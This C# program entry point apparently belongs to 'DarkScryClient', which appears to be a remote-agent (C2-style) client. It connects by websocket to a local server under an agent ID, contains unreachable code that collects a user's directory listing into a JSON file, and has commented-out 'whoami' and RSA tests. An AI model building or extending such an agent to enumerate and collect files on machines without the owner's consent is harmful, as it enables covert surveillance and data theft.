using DarkScryClient;
using DarkScryClient.Client;
using DarkScryClient.Moduls.Collection;
using DarkScryClient.Moduls.Collection.Files;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;


class Program
{

	static async Task Main()
	{
		WsClient wsclient = new WsClient($"ws://127.0.0.1:8765/{Config.agent_id}");
		await wsclient.StartAsync();
		return;
		var data = FilesExplorer.GetFilesAndDirectories(@"C:\Users\aharon");
		File.WriteAllText("output.json", data);
		// test_crypt.test_rsa();
		// socket_test.run_test();
		// test_command_manager.test_whoami();

		using (Client client = new Client())
		{
			client.Start();
		}
	}
}


